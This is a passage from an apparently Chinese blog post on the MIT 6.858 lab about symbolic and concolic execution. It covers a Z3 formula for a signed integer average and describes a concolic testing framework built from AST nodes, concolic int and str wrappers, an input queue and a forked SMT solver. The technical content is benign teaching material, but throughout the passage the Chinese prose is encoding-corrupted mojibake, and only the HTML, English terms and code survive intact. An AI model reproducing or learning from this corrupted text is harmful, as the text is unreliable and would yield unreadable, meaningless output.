æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹è®¡ç®—ç»“æœä¸ºè´Ÿæ•°çš„æƒ…å†µè¿›è¡Œç‰¹æ®ŠåŒ–å¤„ç†ï¼Œ<strong>åœ¨ç»“æœä¸ºè´Ÿæ•°æ—¶å°†å‘ä¸‹å–æ•´å˜ä¸ºå‘ä¸Šå–æ•´</strong>ï¼Œå› æ­¤æœ€åçš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š</p><ul><li><code>tmp = (a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li><li><code>res = tmp + ((tmp &gt;&gt; 31) &amp; (a ^ b))</code></li></ul><p><strong>é¦–å…ˆæŒ‰ç…§æˆ‘ä»¬åŸæ¥çš„å…¬å¼è®¡ç®—å‡ºå‘ä¸‹å–æ•´çš„ç»“æœï¼Œæ¥ä¸‹æ¥å¯¹å…¶ç¬¦å·ä½è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥ä¸º 1 åˆ™å†åˆ¤æ–­å…¶ç§æœ‰éƒ¨åˆ†å¹³å‡å€¼çš„è®¡ç®—æ˜¯å¦å‘ç”Ÿæˆªæ–­ï¼ˆå³ç§æœ‰éƒ¨åˆ†å’Œæ˜¯å¦ä¸ºå¥‡æ•°ï¼‰ï¼Œè‹¥æ˜¯åˆ™è¯´æ˜ç»“æœå‘ç”Ÿäº†å‘ä¸‹å–æ•´ï¼Œæ­¤æ—¶å˜ä¸ºå‘ä¸Šå–æ•´å³å¯</strong></p><p>ç”±äºè¦å¯¹ç¬¦å·ä½è¿›è¡Œåˆ¤æ–­ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>z3.LShR()</code> å°†åˆå§‹è¿ç®—ç»“æœä½œä¸ºæ— ç¬¦å·æ•´å‹è¿›è¡Œå³ç§»æ“ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp = (a &amp; b) + ((a ^ b) &gt;&gt; <span class="hljs-number">1</span>)<br>s_avg = tmp + (z3.LShR(tmp, <span class="hljs-number">31</span>) &amp; (a ^ b))<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸé€šè¿‡ Challenge 1ï¼š</p><p><img src="https://s2.loli.net/2022/12/13/mLWgZvYRqnXSJfx.png" alt="image.png"></p><h2 id="Interlude-what-are-symbolic-and-concolic-execution">Interlude: what are symbolic and concolic execution?</h2><p>æ­£å¦‚æˆ‘ä»¬å‰é¢åœ¨ EXE çš„è®ºæ–‡ä¸­æ‰€è§ï¼Œç¬¦å·æ‰§è¡Œæ˜¯ä¸€ç§é€šè¿‡è§‚æµ‹ç¨‹åºåœ¨ä¸åŒè¾“å…¥ä¸‹å¦‚ä½•è¡¨ç°æ¥è¿›è¡Œç¨‹åºæµ‹è¯•çš„æ–¹æ³•ï¼Œé€šå¸¸è€Œè¨€å…¶ç›®çš„æ˜¯ä¸ºäº†è·å¾—æ›´é«˜çš„ <strong><a href="https://en.wikipedia.org/wiki/Code_coverage">ä»£ç è¦†ç›–ç‡</a></strong> ï¼ˆcode coverageï¼‰æˆ–æ˜¯ <strong>è·¯å¾„è¦†ç›–ç‡</strong> ï¼ˆpath coverageï¼‰ï¼Œåœ¨å®‰å…¨ä¸­å…¶æ¯”ä¼ ç»Ÿä»£ç æ‰§è¡Œæ›´èƒ½è§¦å‘ç½•è§çš„å¯èƒ½åŒ…å«æ¼æ´çš„ä»£ç è·¯å¾„</p><p>ä»æ›´é«˜å±‚æ¬¡è€Œè¨€ï¼Œè‹¥æˆ‘ä»¬è¦æ„å»ºä¸€ä¸ªç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œæˆ‘ä»¬éœ€è¦è§£å†³ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>ç”±äºç¨‹åºåŒ…å«åŸºäºè¾“å…¥çš„ä¸­é—´å€¼ï¼ˆä¾‹å¦‚è¾“å…¥ä¸¤ä¸ªæ•´å‹å¹¶è®¡ç®—å¹³å‡å€¼ï¼Œå¹¶å­˜æ”¾åœ¨ä¸€äº›å˜é‡ä¸­ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½è¾“å…¥ä¸è¿™äº›ä¸­é—´å€¼é—´çš„å…³ç³»ï¼Œé€šå¸¸è¿™é€šè¿‡å…è®¸å˜é‡æˆ–å†…å­˜ä½ç½®æœ‰  <em>å…·ä½“çš„</em> ï¼ˆconcreteï¼Œä¾‹å¦‚ 114514 è¿™æ ·çš„å®é™…å€¼ï¼‰ æˆ–  <em>ç¬¦å·çš„</em>  ï¼ˆsymbolicï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨ä¸Šä¸€å°èŠ‚æ„å»ºçš„ç¬¦å·å˜é‡ï¼‰ å€¼</li><li>æˆ‘ä»¬éœ€è¦æ ¹æ®è¾“å…¥æ¥ç¡®å®šè¦æ‰§è¡Œçš„æ§åˆ¶æµåˆ†æ”¯ï¼Œè¿™å½’ç»“äºåœ¨ç¨‹åºæ¯æ¬¡å‘ç”Ÿåˆ†æ”¯æ—¶æ„å»ºç¬¦å·çº¦æŸï¼Œåœ¨ç¨‹åºé€‰æ‹©ä¸€äº›ç‰¹å®šåˆ†æ”¯æ—¶æè¿°å¸ƒå°”æ¡ä»¶ï¼ˆä»¥ç¨‹åºåŸæœ‰è¾“å…¥çš„å½¢å¼ï¼‰ï¼›ç”±äºæˆ‘ä»¬æŒç»­ä¿å­˜ä¸­é—´å€¼ä¸ç¨‹åºåŸæœ‰è¾“å…¥çš„é—´éš™ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦é€šè¿‡åŸæœ‰è¾“å…¥æ¥è®¡ç®—çº¦æŸï¼Œè¿™äº›çº¦æŸå°±åƒæˆ‘ä»¬åœ¨å‰æ–‡ä¸­ç”¨æ¥å¯»æ‰¾æ•´å‹ä¸­æ¼æ´çš„çº¦æŸï¼›ç¡®å®šæ§åˆ¶æµçº¦æŸéå¸¸é‡è¦ï¼Œå› ä¸ºè‹¥ç¨‹åºåˆå§‹æ—¶è¿›å…¥äº†ç‰¹å®šåˆ†æ”¯è·¯å¾„ï¼Œæˆ‘ä»¬æƒ³è¦çŸ¥é“å¦‚ä½•è®©ä»–èµ°åˆ°å¦ä¸€æ¡è·¯å¾„æ¥å¯»æ‰¾æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œåœ¨ EXE çš„è®ºæ–‡ä¸­ä½¿ç”¨äº†ä¸€ä¸ª C-to-C çš„ç¿»è¯‘å™¨æ¥åœ¨æ‰€æœ‰çš„åˆ†æ”¯ä¸Šæ’å…¥ä»–ä»¬çš„ä»£ç </li><li>å¯¹äºæ¯ä¸€æ¡ä¸Šè¿°åˆ†æ”¯ï¼Œæˆ‘ä»¬éœ€è¦å†³å®šæ˜¯å¦æœ‰ä¸€ä¸ªè¾“å…¥èƒ½å¤Ÿè®©ç¨‹åºåœ¨ä¸€æ¡åˆ†æ”¯ä¸Šæ‰§è¡Œå¦ä¸€æ¡è·¯å¾„ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬è€ƒè™‘æ•´ä¸ªæ§åˆ¶æµè·¯å¾„è€Œéå•ä¸ªè·¯å¾„ï¼‰ï¼Œè¿™å¸®åŠ©æˆ‘ä»¬åœ¨ç¨‹åºä¸­å¯»æ‰¾å¯ä»¥è®©æˆ‘ä»¬é€šè¿‡è°ƒæ•´è¾“å…¥æ¥å½±å“çš„æ§åˆ¶æµæ¡ä»¶ï¼Œæ‰€æœ‰çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿéƒ½åŸºäº SMT æ±‚è§£å™¨æ¥å®Œæˆè¿™äº›å·¥ä½œ</li><li>æˆ‘ä»¬éœ€è¦ç¡®å®šæˆ‘ä»¬åœ¨æµ‹è¯•ä¸­å¯»æ‰¾çš„æ˜¯ä»€ä¹ˆï¼Œè¿™æ˜¯æˆ‘ä»¬ä»ç¨‹åºä¸­ç¡®ä¿  <em>ä¸å˜é‡</em>  ï¼ˆinvariantï¼‰æ¥è€ƒè™‘çš„æœ€ä½³æ–¹æ³•ï¼Œè€Œç¬¦å·æ‰§è¡Œå¯»æ‰¾æ”¹å˜è¿™äº›å¸¸é‡çš„è¾“å…¥ï¼ˆ<s>ğŸ‘´ä¹Ÿæ²¡å’‹è¯»æ˜ç™½ï¼Œå¯ä»¥çœ‹å®éªŒæ‰‹å†ŒåŸå¥</s>ï¼‰ï¼›æˆ‘ä»¬å¯ä»¥å¯»æ‰¾çš„äº‹ç‰©ä¹‹ä¸€æ˜¯<strong>ç¨‹åºå´©æºƒ</strong>ï¼ˆcrashesï¼Œå³ä¸å˜é‡æ˜¯  <em>æˆ‘ä»¬çš„ç¨‹åºä¸åº”å½“å´©æºƒ</em>  ï¼‰ï¼Œåœ¨ C ç¨‹åºä¸­è¿™éå¸¸æœ‰æ„ä¹‰ï¼Œå› ä¸º crashes é€šå¸¸æŒ‡ç¤ºäº†ä»£è¡¨æ¼æ´çš„å†…å­˜æŸåï¼Œåœ¨ Python è¿™æ ·æ›´é«˜çº§çš„è¯­è¨€ä¸­åœ¨è®¾è®¡ä¸Šå¹¶ä¸å­˜åœ¨å†…å­˜æŸåï¼Œä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥å¯»æ‰¾å¦‚ Python ä»£ç çº§çš„ä»£ç æ³¨å…¥æ”»å‡»ï¼ˆä¾‹å¦‚ <code>eval()</code> ï¼‰æˆ–æ˜¯ç‰¹å®šäºæŸç§åº”ç”¨çš„å½±å“å®‰å…¨çš„ä¸å˜é‡</li><li>æœ€ç»ˆï¼Œå¯¹äºç»™å‡ºç¨‹åºä¸­æ‰€æœ‰å¯èƒ½æ‰§è¡Œçš„æ§åˆ¶æµè·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦å†³å®šè¯¥å°è¯•å“ªæ¡è·¯å¾„ï¼Œå› ä¸ºè·¯å¾„æ•°é‡ä¼šéšç€ç¨‹åºè§„æ¨¡çš„å¢å¤§è€Œå¿«é€Ÿå¢é•¿ï¼Œæˆ‘ä»¬ä¸å¯èƒ½å°è¯•æ‰€æœ‰çš„è·¯å¾„ï¼Œå› æ­¤ç¬¦å·æ‰§è¡Œç³»ç»Ÿé€šå¸¸åŒ…å«ç¡®å®šå“ªä¸€æ¡è·¯å¾„æ›´æœ‰å¸Œæœ›å‘ç°ç ´åä¸å˜é‡çš„æŸç§  <em>è°ƒåº¦å™¨</em>  ï¼ˆschedulerï¼‰æˆ–  <em>æœç´¢ç­–ç•¥</em>  ï¼ˆsearch strategyï¼‰ï¼Œä¸€ä¸ªç®€å•çš„æœç´¢ç­–ç•¥ä¾‹å­ä¾¿æ˜¯å°è¯•æœªæ‰§è¡Œè¿‡çš„è·¯å¾„ï¼Œè¿™ä»£è¡¨ç€æ›´é«˜çš„ä»£ç è¦†ç›–ç‡ä¸æœªè¢«å‘ç°çš„æ¼æ´çš„å­˜åœ¨çš„å¯èƒ½æ€§</li></ul><p>ä¸ç¬¦å·æ‰§è¡Œç›¸å¯¹çš„ä¸€ä¸ªé€‰æ‹©æ˜¯  <a href="https://en.wikipedia.org/wiki/Fuzz_testing">fuzzing</a> ï¼ˆåˆç§° fuzz-testingï¼Œæ¨¡ç³Šæµ‹è¯•ï¼‰ï¼Œå…¶é€‰æ‹©äº†ä¸€ä¸ªéšæœºåŒ–æ–¹æ¡ˆï¼šä¸åŒäºå…³æ³¨è§¦å‘åº”ç”¨ä¸­ä¸åŒä»£ç è·¯å¾„çš„åŸå› ï¼Œfuzzing ä¼šåˆ›å»ºéšæœºçš„å…·ä½“å€¼äº¤ç»™ç¨‹åºæ‰§è¡Œå¹¶æ£€æŸ¥å…¶è¡Œä¸ºï¼›è™½ç„¶è¿™æ¯”ç¬¦å·æ‰§è¡Œæ›´ç®€å•ï¼Œä½†é€šå¸¸å¾ˆéš¾æ„é€ èƒ½æ»¡è¶³ç¨‹åºä»£ç ä¸­ä¸€äº›ç‰¹å®šæƒ…å†µçš„è¾“å…¥</p><p>æ„å»ºç¬¦å·æ‰§è¡Œç³»ç»Ÿçš„ä¸€ä¸ªæŒ‘æˆ˜æ˜¯æˆ‘ä»¬çš„ç³»ç»Ÿéœ€è¦çŸ¥é“å¦‚ä½•åœ¨ç¬¦å·å€¼ä¸Šæ‰§è¡Œæ‰€æœ‰å¯èƒ½çš„æ“ä½œï¼ˆä¸Šé¢çš„ Step 1 &amp; 2ï¼‰ï¼Œåœ¨æœ¬ Lab ä¸­æˆ‘ä»¬å°†åœ¨ Python å¯¹è±¡ï¼ˆæ›´å‡†ç¡®åœ°è¯´ï¼Œæ•´å‹ä¸å­—ç¬¦ä¸²ï¼‰ä¸Šå®è·µï¼Œå¯¹äºç¬¦å·æ‰§è¡Œè€Œè¨€è¿™å¾ˆæœ‰æŒ‘æˆ˜æ€§ï¼Œå› ä¸º Python å¯¹è±¡å¯ä»¥å®ç°çš„æ“ä½œæœ‰å¾ˆå¤š</p><p>å¹¸è¿çš„æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªæ›´ç®€å•çš„é€‰æ‹©â€”â€”  <em>æ··åˆæ‰§è¡Œ</em>  ï¼ˆ<strong>concolic execution</strong>ï¼‰ï¼Œä»‹äºå®Œå…¨éšæœºçš„æ¨¡ç³Šæµ‹è¯•ä¸å®Œå…¨çš„ç¬¦å·æ‰§è¡Œä¹‹é—´ï¼Œç›¸è¾ƒäºè·Ÿè¸ªçº¯å‡€çš„ç¬¦å·å€¼ï¼ˆå¦‚ EXE ä¸­æ‰€åšï¼‰ï¼Œå…¶æ€æƒ³æ˜¯ï¼šå¯¹äºä»è¾“å…¥ä¸­å¾—åˆ°çš„å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥<strong>åŒæ—¶ä¿å­˜ä¸€ä¸ªå…·ä½“å€¼ä¸ä¸€ä¸ªç¬¦å·å€¼</strong>ï¼Œç”±æ­¤ï¼š</p><ul><li>è‹¥æˆ‘ä»¬çš„ concolic system çŸ¥é“åº”ç”¨çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥åƒç¬¦å·æ‰§è¡Œé‚£æ ·è¿è¡Œï¼ˆé™¤äº†æˆ‘ä»¬è¿˜ä¼šåŒæ—¶ä¼ æ’­æ¯ä¸ªå€¼çš„ concrete éƒ¨åˆ†ï¼‰ï¼›ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ª concolic æ•´å‹å˜é‡ <code>aa</code> ä¸ <code>bb</code>ï¼Œå…¶æœ‰ç€å…·ä½“å€¼ <code>5</code> ä¸ <code>6</code> ï¼Œå¹¶å¯¹åº”ç¬¦å·è¡¨è¾¾å¼ <code>a</code> ä¸  <code>b</code>ï¼Œæ­¤æ—¶è‹¥åº”ç”¨åˆ›å»ºäº†ä¸€ä¸ªå˜é‡ <code>cc = aa + bb</code>ï¼Œå…¶ä¼šåŒæ—¶æœ‰ç€å…·ä½“å€¼ <code>11</code> åŠç¬¦å·è¡¨è¾¾å¼ <code>a + b</code>ï¼›ç±»ä¼¼åœ°ï¼Œè‹¥åº”ç”¨åœ¨ <code>cc == 12</code> çš„åˆ†æ”¯ä¸Šæ‰§è¡Œï¼Œç¨‹åºå¯ä»¥åƒåˆ†æ”¯ä¸ºå‡ä¸€æ ·æ‰§è¡Œï¼Œå¹¶è®°å½•å¯¹åº”çš„ç¬¦å·åˆ†æ”¯æ¡ä»¶ <code>a + b != 12</code></li><li>è‹¥æˆ‘ä»¬çš„ concolic system ä¸çŸ¥é“åº”ç”¨çš„å½“å‰è¡Œä¸ºï¼Œåº”ç”¨å°†åªä¼šå¾—åˆ°å…·ä½“çš„å€¼ï¼›ä¾‹å¦‚è‹¥åº”ç”¨å°† <code>cc</code> å†™å…¥æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æ˜¯ä¼ é€’åˆ°å¤–éƒ¨åº“ä¸­ï¼Œä»£ç ä»å¯ä»¥ä½¿ç”¨å…·ä½“å€¼ <code>11</code> å¦‚åŒåº”ç”¨æ­£å¸¸è¿è¡Œé‚£æ ·ç»§ç»­æ‰§è¡Œ</li></ul><p>å¯¹äºæœ¬ lab è€Œè¨€ï¼Œæ··åˆæ‰§è¡Œçš„å¥½å¤„æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦å®Œå…¨å®Œæˆå¯¹ç¬¦å·å€¼çš„æ“ä½œæ”¯æŒï¼Œæˆ‘ä»¬åªéœ€è¦æ”¯æŒè¶³å¤Ÿå‘ç°æ¼æ´çš„æ“ä½œå³å¯ï¼ˆå®é™…ä¸Šå¤§éƒ¨åˆ†æŒ–æ´ç³»ç»Ÿä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ï¼Œä¸è¿‡è‹¥åº”ç”¨æ‰§è¡Œäº†æˆ‘ä»¬æ‰€ä¸æ”¯æŒçš„æ“ä½œï¼Œæˆ‘ä»¬å°†å¤±å»å¯¹ç¬¦å·éƒ¨åˆ†çš„è·Ÿè¸ªï¼Œå¹¶æ— æ³•å¯¹è¿™äº›è·¯å¾„è¿›è¡Œç¬¦å·æ‰§è¡Œå¼çš„ï¼ˆsymbolic-execution-styleï¼‰æ¢ç´¢ï¼Œè‹¥æƒ³äº†è§£æ›´å¤šå¯ä»¥å‚è§  <a href="http://css.csail.mit.edu/6.858/2022/readings/dart.pdf">DART paper</a></p><h2 id="Concolic-execution-for-integers">Concolic execution for integers</h2><p>é¦–å…ˆæˆ‘ä»¬å°†ä¸ºæ•´å‹å€¼æ„å»ºä¸€ä¸ªæ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œæœ¬ Lab ä¸ºæˆ‘ä»¬çš„æ··åˆæ‰§è¡Œæä¾›çš„æ¡†æ¶ä»£ç ä½äº <code>symex/fuzzy.py</code> ä¸­ï¼Œå…¶å®ç°äº†å‡ ä¸ªé‡è¦çš„æŠ½è±¡å±‚ï¼š</p><ul><li><p><strong>æŠ½è±¡è¯­æ³•æ ‘</strong>ï¼ˆThe ASTï¼‰ï¼šä¸æ­¤å‰æˆ‘ä»¬åœ¨ <code>int-avg.py</code> ä¸­ä½¿ç”¨ Z3 è¡¨è¾¾å¼æ¥è¡¨ç¤ºç¬¦å·å€¼æ‰€ä¸åŒçš„æ˜¯ï¼Œæœ¬ Lab æ„å»ºäº†å…¶è‡ªå·±çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆabstract syntax treeï¼‰æ¥è¡¨è¾¾ç¬¦å·è¡¨è¾¾å¼ï¼Œä¸€ä¸ª AST èŠ‚ç‚¹å¯ä»¥æ˜¯ä¸€ä¸ªç®€å•çš„å˜é‡ï¼ˆ <code>sym_str</code> æˆ– <code>sym_int</code> å¯¹è±¡ï¼‰ã€ä¸€ä¸ªå¸¸é‡ï¼ˆ<code>const_int</code>ã€<code>const_str</code> æˆ– <code>const_bool</code> å¯¹è±¡ï¼‰ã€æˆ–æ˜¯ä¸€äº›å°†å…¶ä»– AST èŠ‚ç‚¹ä½œä¸ºå‚æ•°çš„å‡½æ•°æˆ–æ“ä½œç¬¦ï¼ˆä¾‹å¦‚ <code>sym_eq(a, b)</code> è¡¨ç¤ºå¸ƒå°”è¡¨è¾¾å¼ <code>a==b</code>ï¼Œå…¶ä¸­ <code>a</code> ä¸ <code>b</code> éƒ½æ˜¯ AST èŠ‚ç‚¹ï¼Œæˆ–æ˜¯ <code>sym_plus(a, b)</code> è¡¨ç¤ºæ•´å‹è¡¨è¾¾å¼ <code>a + b</code>ï¼‰</p><p>æ¯ä¸ª AST èŠ‚ç‚¹ <code>n</code> éƒ½å¯ä»¥ä½¿ç”¨ <code>z3expr(n)</code> è½¬åŒ–ä¸º Z3 è¡¨è¾¾å¼ï¼Œè¿™ç”±è°ƒç”¨ <code>n._z3expr</code> å®Œæˆï¼Œå³æ¯ä¸ª AST èŠ‚ç‚¹éƒ½å®ç°äº†è¿”å›å¯¹åº” Z3 è¡¨è¾¾å¼çš„ <code>_z3expr</code> æ–¹æ³•</p><p>æˆ‘ä»¬ä½¿ç”¨è‡ªå·±çš„ AST å±‚è€Œéä½¿ç”¨ Z3 çš„ç¬¦å·è¡¨ç¤ºçš„åŸå› æ˜¯å› ä¸ºæˆ‘ä»¬éœ€è¦å®ç°ä¸€äº› Z3 è¡¨ç¤ºéš¾ä»¥å®Œæˆçš„æ“ä½œï¼Œæ­¤å¤–æˆ‘ä»¬éœ€è¦åˆ†å‡ºä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¥è°ƒç”¨ Z3 çš„æ±‚è§£å™¨ï¼Œä»¥åœ¨ Z3 æ±‚è§£å™¨è€—æ—¶è¿‡é•¿æ—¶æ€æ­»è¿›ç¨‹â€”â€”å°†çº¦æŸå½’ä¸ºä¸å¯è§£ï¼ˆè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½å¤±å»è¿™äº›è·¯å¾„ï¼Œä½†è‡³å°‘æˆ‘ä»¬ä¼šè®©ç¨‹åºæ¢ç´¢å…¶ä»–è·¯å¾„ï¼‰ï¼›ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ AST èƒ½è®©æˆ‘ä»¬å°† Z3 çŠ¶æ€å®Œå…¨ç‹¬ç«‹åœ¨ fork å‡ºçš„è¿›ç¨‹é‡Œ</p></li><li><p><strong>æ··åˆå°è£…</strong>ï¼ˆThe concolic wrappersï¼‰ï¼šä¸ºäº†æ‹¦æˆª python-level çš„æ“ä½œå¹¶è¿›è¡Œæ··åˆæ‰§è¡Œï¼Œæˆ‘ä»¬å°†å¸¸è§„çš„ <code>int</code> ä¸ <code>str</code> å¯¹è±¡æ›¿æ¢æˆäº†æ··åˆçš„å­ç±»ï¼š<code>concolic_int</code> ç»§æ‰¿è‡ª <code>int</code> è€Œ <code>concolic_str</code> ç»§æ‰¿è‡ª <code>str</code>ï¼Œæ¯ä¸€ä¸ªæ··åˆå°è£…éƒ½åŒæ—¶å­˜å‚¨ä¸€ä¸ªå…·ä½“å€¼ï¼ˆ<code>self.__v</code> ï¼‰ä¸ä¸€ä¸ªç¬¦å·è¡¨è¾¾å¼ï¼ˆä¸ AST èŠ‚ç‚¹ï¼Œåœ¨ <code>self.__sym</code>ï¼‰ï¼Œå½“åº”ç”¨åœ¨è®¡ç®—æ··åˆå€¼è¡¨è¾¾å¼ï¼ˆä¾‹å¦‚ <code>a+1</code> ä¸­çš„ <code>a</code> ä¸º <code>concolic_int</code>ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ‹¦æˆªè¯¥æ“ä½œå¹¶è¿”å›ä¸€ä¸ªåŒæ—¶åŒ…å«å…·ä½“å€¼ä¸ç¬¦å·è¡¨è¾¾å¼çš„çš„æ··åˆå€¼</p><p>ä¸ºäº†å®ç°è¿™æ ·çš„æ‹¦æˆªæ“ä½œï¼Œæˆ‘ä»¬é‡è½½äº† <code>concolic_int</code> ä¸ <code>concolic_str</code> ç±»ä¸­çš„ä¸€äº›æ–¹æ³•ï¼Œä¾‹å¦‚ <code>concolic_int.__add__</code> åœ¨ä¸Šé¢çš„ä¾‹å­ <code>a + 1</code> ä¸­ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªæ–°çš„æ··åˆå€¼è¡¨ç¤ºç»“æœ</p><p>åŸåˆ™ä¸Šæˆ‘ä»¬åº”è¯¥ä¹Ÿè¦æœ‰ä¸€ä¸ª <code>concolic_bool</code> ä½œä¸º <code>bool</code> çš„å­ç±»ï¼Œä¸å¹¸çš„æ˜¯åœ¨ Python ä¸­ <code>bool</code> ä¸èƒ½è¢«ç»§æ‰¿ï¼ˆå‚è§<a href="https://docs.python.org/3/library/functions.html#bool">è¿™é‡Œ</a> ä¸ <a href="https://mail.python.org/pipermail/python-dev/2002-March/020822.html">è¿™é‡Œ</a>ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬åˆ›å»ºäº†å‡½æ•° <code>concolic_bool</code> ä½œä¸ºä»£æ›¿ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ··åˆå¸ƒå°”å€¼æ—¶ï¼Œç¨‹åºä¼šæŒ‰å…¶å€¼è¿›è¡Œåˆ†æ”¯ï¼Œæ•… <code>concolic_bool</code> ä¹Ÿä¼šä¸ºå½“å‰è·¯å¾„æ¡ä»¶æ·»åŠ ä¸€ä¸ªçº¦æŸï¼ˆå¸ƒå°”å€¼çš„ç¬¦å·è¡¨è¾¾å¼ä¸å…·ä½“å€¼ç›¸ç­‰çš„çº¦æŸï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªå…·ä½“çš„å¸ƒå°”å€¼</p></li><li><p><strong>å…·ä½“è¾“å…¥</strong>ï¼ˆThe concrete inputsï¼‰ï¼šåœ¨æ··åˆæ‰§è¡Œä¸‹è¢«æµ‹è¯•çš„ç¨‹åºè¾“å…¥éƒ½å­˜å‚¨åœ¨ <code>concrete_values</code> å­—å…¸ä¸­ï¼Œåœ¨è¯¥å­—å…¸ä¸­å­˜å‚¨äº†ç¨‹åºè¾“å…¥çš„å­—ç¬¦ä¸²åå­—ï¼Œå¹¶å°†æ¯ä¸ªåå­—æ˜ å°„åˆ°å¯¹åº”çš„è¾“å…¥å€¼ï¼ˆæ•´å‹å˜é‡çš„å€¼ä¸ºpythonæ•´å‹ï¼Œå­—ç¬¦ä¸²å˜é‡ä¸ºpythonå­—ç¬¦ä¸²ï¼‰</p><p><code>concrete_value</code> è¢«è®¾ä¸ºå…¨å±€å˜é‡çš„åŸå› æ˜¯åº”ç”¨é€šè¿‡è°ƒç”¨ <code>fuzzy.mk_str(name)</code> æˆ– <code>fuzzy.mk_int(name)</code> æ¥åˆ›å»ºä¸€ä¸ªæ··åˆå­—ç¬¦ä¸²æˆ–æ··åˆæ•´å‹ï¼Œå…¶è¿”å›ä¸€ä¸ªæ··åˆå€¼ï¼Œå…¶ä¸­çš„ç¬¦å·éƒ¨åˆ†ä¸ºä¸€ä¸ªæ–°çš„ AST èŠ‚ç‚¹å¯¹åº”åˆ°ä¸€ä¸ªåä¸º <code>name</code> çš„å˜é‡ï¼Œä½†å…·ä½“å€¼è¢«åœ¨ <code>concrete_values</code> ä¸­æŸ¥æ‰¾ï¼Œè‹¥å­—å…¸ä¸­æ²¡æœ‰ä¸ä¹‹å…³è”çš„å˜é‡ï¼Œç³»ç»Ÿå°†å…¶è®¾ä¸ºé»˜è®¤çš„åˆå§‹å€¼ï¼ˆæ•´å‹ä¸º0ï¼Œå­—ç¬¦ä¸²ä¸ºç©ºä¸²ï¼‰</p><p>æ··åˆæ‰§è¡Œæ¡†æ¶åœ¨ä¸€ä¸ª <code>InputQueue</code> å¯¹è±¡ä¸­ç»´æŒä¸€ä¸ªå¾…å°è¯•çš„ä¸åŒè¾“å…¥çš„é˜Ÿåˆ—ï¼Œæ¡†æ¶é¦–å…ˆä¼šæ·»åŠ ä¸€ä¸ªåˆå§‹è¾“å…¥ï¼ˆç©ºå­—å…¸ <code>&#123;&#125;</code>ï¼‰ï¼Œä¹‹åæ‰§è¡Œä»£ç ï¼Œè‹¥åº”ç”¨è¿›å…¥äº†åˆ†æ”¯ï¼Œæ··åˆæ‰§è¡Œç³»ç»Ÿå°†å”¤é†’ Z3 æ¥å¸¦æ¥ æ–°çš„è¾“å…¥ä»¥æµ‹è¯•ä»£ç ä¸­çš„å…¶ä»–åˆ†æ”¯ï¼Œå°†è¿™äº›è¾“å…¥æ”¾åˆ°è¾“å…¥é˜Ÿåˆ—ä¸­ï¼Œå¹¶ä¿æŒè¿­ä»£ç›´åˆ°æ²¡æœ‰è¾“å…¥å¯ä»¥å°è¯•</p></li><li><p><strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨</strong>ï¼ˆThe SMT solverï¼‰ï¼š <code>fork_and_check(c)</code> å‡½æ•°ä¼šæ£€æŸ¥çº¦æŸ <code>c</code> ï¼ˆä¸€ä¸ª AST èŠ‚ç‚¹ï¼‰æ˜¯å¦ä¸ºå¯æ»¡è¶³çš„è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›ä¸€å¯¹å€¼ï¼šå¯æ»¡è¶³æ€§çŠ¶æ€ <code>ok</code> åŠç¤ºä¾‹æ¨¡å‹ï¼ˆåˆ†é…ç»™å˜é‡çš„å€¼ï¼‰ï¼Œè‹¥çº¦æŸå¯ä»¥è¢«æ»¡è¶³åˆ™ <code>ok</code> ä¸º <code>z3.sat</code> ï¼Œè‹¥çº¦æŸä¸å¯è¢«æ»¡è¶³åˆ™ <code>ok</code> ä¸º <code>z3.unsat</code> æˆ– <code>z3.unknown</code>ï¼›è¯¥å‡½æ•°å†…éƒ¨ä¼š fork ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¥è¿è¡Œ Z3 æ±‚è§£å™¨ï¼Œè‹¥è€—æ—¶è¶…è¿‡ <code>z3_timeout</code> åˆ™æ€æ­»è¿›ç¨‹å¹¶è¿”å› <code>z3.unknown</code></p></li><li><p><strong>å½“å‰è·¯å¾„æ¡ä»¶</strong>ï¼ˆThe current path conditionï¼‰ï¼šå½“åº”ç”¨æ‰§è¡Œå¹¶åŸºäºæ··åˆå€¼å†³å®šæ§åˆ¶æµæ—¶ï¼ˆå‚è§ä¸Šé¢å…³äº <code>concolic_bool</code> çš„è®¨è®ºï¼‰ï¼Œè¡¨ç¤ºè¯¥åˆ†æ”¯çš„çº¦æŸä¼šè¢«æ·»åŠ åˆ° 